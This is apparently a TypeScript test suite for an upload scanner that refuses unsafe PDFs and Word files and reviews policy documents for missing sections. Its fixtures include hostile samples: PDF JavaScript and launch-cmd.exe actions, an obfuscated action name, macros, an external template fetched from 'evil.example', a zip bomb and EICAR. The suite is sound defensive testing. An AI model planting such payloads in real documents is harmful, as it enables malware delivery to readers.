/**
 * Checks, without a database or server, that uploaded documents are scanned and read correctly:
 *
 *   npm run test:document-security -w apps/api
 *
 * Unsafe files (JavaScript in a PDF, macros or embedded objects in Word, a zip bomb, a program renamed to .pdf, the EICAR test file) are
 * refused; real documents pass; ClamAV is spoken to correctly (against a small stand-in for clamd); and a complete policy is found complete,
 * a policy with gaps lists what is missing, and a file with no readable text is reported as such.
 */
import assert from 'node:assert/strict';
import net from 'node:net';
import { strToU8, zipSync } from 'fflate';
import { scanDocument, scanWithClamd } from '../services/documentSecurity.js';
import { reviewPolicyFile } from '../services/policyReview.js';
import { EICAR_FILE, POLICY_GAPS, POLICY_GOOD, makeDocx, makePdf } from './testDocs.js';

const PDF = 'application/pdf';
const DOCX = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document';
const checks: [string, () => Promise<void>][] = [];
const check = (name: string, fn: () => Promise<void>) => checks.push([name, fn]);
delete process.env.CLAMAV_SOCKET; delete process.env.CLAMAV_HOST; delete process.env.CLAMAV_REQUIRED;

// --- A stand-in for clamd: answers the INSTREAM command like the real thing ---
function fakeClamd(): Promise<{ port: number; close: () => void }> {
  return new Promise((resolve) => {
    const server = net.createServer((sock) => {
      const chunks: Buffer[] = [];
      sock.on('data', (d) => {
        chunks.push(d);
        const all = Buffer.concat(chunks);
        if (!all.subarray(0, 10).equals(Buffer.from('zINSTREAM\0'))) return;
        // The stream ends with a zero-length chunk.
        let off = 10; let body = Buffer.alloc(0);
        while (off + 4 <= all.length) {
          const len = all.readUInt32BE(off); off += 4;
          if (len === 0) { sock.end(body.includes('EICAR') ? 'stream: Eicar-Test-Signature FOUND\0' : 'stream: OK\0'); return; }
          if (off + len > all.length) return;
          body = Buffer.concat([body, all.subarray(off, off + len)]); off += len;
        }
      });
    }).listen(0, '127.0.0.1', () => resolve({ port: (server.address() as net.AddressInfo).port, close: () => server.close() }));
  });
}

check('a real PDF and a real Word file pass the scan', async () => {
  assert.equal((await scanDocument(makePdf(POLICY_GOOD), PDF)).ok, true);
  const r = await scanDocument(makeDocx(POLICY_GOOD), DOCX);
  assert.equal(r.ok, true); assert.equal(r.engine, 'built-in'); assert.match(r.sha256, /^[0-9a-f]{64}$/);
});
check('a PDF with JavaScript, a launch action or an embedded file is refused', async () => {
  for (const extra of ['/OpenAction << /S /JavaScript /JS (app.alert(1)) >>', '/OpenAction << /S /Launch /F (cmd.exe) >>', '/Names << /EmbeddedFiles << >> >>', '/OpenAction << /S /J#61vaScript /J#53 (x) >>']) {
    const r = await scanDocument(makePdf(POLICY_GOOD, extra), PDF);
    assert.equal(r.ok, false, extra); assert.equal(r.blocked?.kind, 'active_content', extra);
  }
});
check('a Word file with macros, embedded objects, a macro content type or an external template is refused', async () => {
  const variants: [string, Buffer][] = [
    ['macros', makeDocx(POLICY_GOOD, { 'word/vbaProject.bin': new Uint8Array([1, 2, 3]) })],
    ['embedded program', makeDocx(POLICY_GOOD, { 'word/embeddings/oleObject1.bin': new Uint8Array([1]) })],
    ['macro content type', makeDocx(POLICY_GOOD, {}, 'application/vnd.ms-word.document.macroEnabled.main+xml')],
    ['external template', makeDocx(POLICY_GOOD, { 'word/_rels/document.xml.rels': '<Relationships xmlns="x"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>' })],
    ['a script inside', makeDocx(POLICY_GOOD, { 'word/payload.js': 'alert(1)' })],
  ];
  for (const [label, body] of variants) { const r = await scanDocument(body, DOCX); assert.equal(r.ok, false, label); }
});
check('a zip bomb is refused without being unpacked', async () => {
  const bomb = Buffer.from(zipSync({ ...{ '[Content_Types].xml': strToU8('x'), 'word/document.xml': strToU8('x') }, 'word/media/big.bin': new Uint8Array(45 * 1024 * 1024) }, { level: 9 }));
  assert.ok(bomb.length < 1024 * 1024, `bomb is ${bomb.length} bytes`);
  const r = await scanDocument(bomb, DOCX);
  assert.equal(r.ok, false);
});
check('a program renamed as a document, a plain-text file and the EICAR test file are refused', async () => {
  assert.equal((await scanDocument(Buffer.concat([Buffer.from('MZ'), Buffer.alloc(200)]), PDF)).ok, false);
  const eicarPdf = Buffer.concat([makePdf(POLICY_GOOD), EICAR_FILE]);
  const r = await scanDocument(eicarPdf, PDF);
  assert.equal(r.ok, false); assert.equal(r.blocked?.kind, 'malware');
  assert.equal((await scanDocument(Buffer.from('this is not a docx'), DOCX)).ok, false);
});
check('ClamAV is asked, clean files pass and infected files are refused with the signature', async () => {
  const clam = await fakeClamd();
  try {
    process.env.CLAMAV_HOST = '127.0.0.1'; process.env.CLAMAV_PORT = String(clam.port);
    const clean = await scanDocument(makePdf(POLICY_GOOD), PDF);
    assert.equal(clean.ok, true); assert.equal(clean.engine, 'clamav+built-in');
    assert.deepEqual(await scanWithClamd(Buffer.from('hello')), { status: 'clean' });
    // The stand-in recognises EICAR even where the built-in check would not look (the string is split across chunks here).
    const sig = await scanWithClamd(Buffer.concat([Buffer.alloc(70_000), EICAR_FILE]));
    assert.equal(sig.status, 'infected'); assert.equal(sig.signature, 'Eicar-Test-Signature');
  } finally { clam.close(); }
});
check('with ClamAV switched off and required, uploads are paused; otherwise the built-in checks still run', async () => {
  process.env.CLAMAV_HOST = '127.0.0.1'; process.env.CLAMAV_PORT = '1'; // nothing listens there
  const open = await scanDocument(makePdf(POLICY_GOOD), PDF);
  assert.equal(open.ok, true); assert.equal(open.engine, 'built-in');
  process.env.CLAMAV_REQUIRED = 'true';
  const closed = await scanDocument(makePdf(POLICY_GOOD), PDF);
  assert.equal(closed.ok, false); assert.equal(closed.blocked?.kind, 'unavailable');
  delete process.env.CLAMAV_REQUIRED; delete process.env.CLAMAV_HOST; delete process.env.CLAMAV_PORT;
});
check('a complete policy (PDF and Word) is read and nothing essential is missing', async () => {
  for (const [label, body, type] of [['pdf', makePdf(POLICY_GOOD), PDF], ['docx', makeDocx(POLICY_GOOD), DOCX]] as const) {
    const r = await reviewPolicyFile(body, type);
    assert.equal(r.status, 'ok', `${label}: missing ${r.missing.map((m) => m.key).join(', ')}`);
    assert.ok(r.words > 200, `${label} words ${r.words}`);
    assert.equal(r.missing.length, 0, `${label}: missing ${r.missing.map((m) => m.key).join(', ')}`);
  }
});
check('a policy with gaps lists what is missing, essentials first, with what to add', async () => {
  const r = await reviewPolicyFile(makePdf(POLICY_GAPS), PDF);
  assert.equal(r.status, 'gaps');
  const keys = r.missing.map((m) => m.key);
  for (const k of ['c_external', 'c_records', 'i_define', 'i_notify', 'i_time', 'i_immediate']) assert.ok(keys.includes(k), `expected ${k} to be missing`);
  assert.ok(r.missing.every((m) => m.advice.length > 20));
  // Removing one point from the complete policy reports exactly that point.
  const noTimes = POLICY_GOOD.replace(/ within 24 hours, and of an unauthorised restrictive practice within 5 business days/, '');
  const r2 = await reviewPolicyFile(makeDocx(noTimes), DOCX);
  assert.deepEqual(r2.missing.map((m) => m.key), ['i_time']);
});
check('a file with no readable text is reported as unreadable, with advice', async () => {
  const r = await reviewPolicyFile(makePdf('x'), PDF);
  assert.equal(r.status, 'unreadable'); assert.match(r.note ?? '', /scan|read/i);
  const bad = await reviewPolicyFile(Buffer.from('%PDF-1.4 garbage'), PDF);
  assert.equal(bad.status, 'unreadable');
});

let failed = 0;
for (const [name, fn] of checks) {
  try { await fn(); console.log(`ok   ${name}`); } catch (err) { failed += 1; console.log(`FAIL ${name}\n     ${(err as Error).message}`); }
}
console.log(failed ? `\n${failed} of ${checks.length} checks failed.` : `\nAll ${checks.length} checks passed.`);
process.exit(failed ? 1 : 0);
